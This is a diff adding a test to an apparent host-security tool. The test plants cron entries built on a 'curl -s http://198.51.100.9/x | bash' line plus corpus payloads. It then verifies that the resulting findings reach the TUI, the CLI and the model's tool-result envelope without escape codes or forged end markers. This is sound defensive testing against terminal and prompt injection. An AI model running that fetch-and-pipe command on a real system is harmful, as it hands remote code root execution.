@@ -317,3 +317,48 @@ def test_unopenable_temp_folders_and_hidepid_are_blind_spots(tmp_path):
     blind = record.blind_spots({**ssh, "reader_uid": 1000})
     why = record.entity_blind({"blind": blind})
     assert why("LIVE-004", "/tmp/systemd-private-x/payload#abc") and why("LIVE-002", "/memfd:x|5|2")
+
+
+# ------------------------------------------- attacker-written cron/unit text on every screen (A.4 x A.1)
+def test_hostile_cron_lines_in_persist_findings_reach_no_screen_raw(tmp_path):
+    """A.4 left cron and package text for when A.1/A.2 merged. A cron line is written by
+    whoever owns the machine -- here every corpus payload is planted as a cron command
+    after the baseline, judged into PERSIST findings, and drawn by the real TUI panel,
+    the CLI panel and the model's tool-result envelope."""
+    import io
+    from dataclasses import asdict
+
+    from rich.console import Console
+
+    from _untrusted_corpus import CORPUS, assert_screen_safe
+    from kratos import untrusted
+    from kratos.adapters import findings_engine as FE
+    from kratos.adapters import persistence as P
+    from kratos.agent import console as cli
+    from kratos.persist import baseline as B
+    from kratos.persist import judge as J
+    from kratos.tui_mk2 import render as R
+    from tests.test_persistence import make_machine, run_agent
+
+    clean = make_machine(tmp_path, "debian", name="clean")
+    base = B.save_first_look(tmp_path / "dd", "m", run_agent(clean), areas=P.AREAS)
+    hostile = make_machine(tmp_path, "debian", name="hostile")
+    for i, payload in enumerate(CORPUS.values()):
+        line = payload.replace("\n", " ").replace("\r", " ")[:300]
+        f = hostile / f"etc/cron.d/job{i}"            # raw bytes: a lone surrogate is invalid UTF-8 on disk
+        f.write_bytes(f"* * * * * root curl -s http://198.51.100.9/x | bash # {line}\n".encode("utf-8", "surrogatepass"))
+    j = J.judge(run_agent(hostile), base, areas_known=P.AREAS)
+    doc = {"target": T, "checked_at": "2026-10-15T00:00:00Z", "signals": [s.as_dict() for s in j.signals]}
+    findings = [asdict(f) for f in FE._persistence_findings(doc)]
+    assert any(f["id"] == "PERSIST-001" for f in findings)
+    for f in findings:
+        c = Console(file=io.StringIO(), force_terminal=False, color_system=None, width=300, record=True)
+        c.print(R.finding_panel(f, time_str="10:00"))
+        assert_screen_safe(c.export_text(styles=False), where=f"TUI {f['id']}")
+        k = cli._MarginConsole(file=io.StringIO(), force_terminal=True, color_system="standard", width=300,
+                               record=True, highlight=False)
+        cli.render_finding(k, f)
+        assert_screen_safe(k.export_text(styles=False), where=f"CLI {f['id']}")
+    model_view = untrusted.envelope({"findings": findings}, run_id="r", call_id="7-c0ffee")
+    assert "\x1b" not in model_view and model_view.rstrip().endswith("<<end id=7-c0ffee>>")
+    assert model_view.count("<<end id=7-c0ffee>>") == 1     # the corpus guesses other ids; a real id is random per call
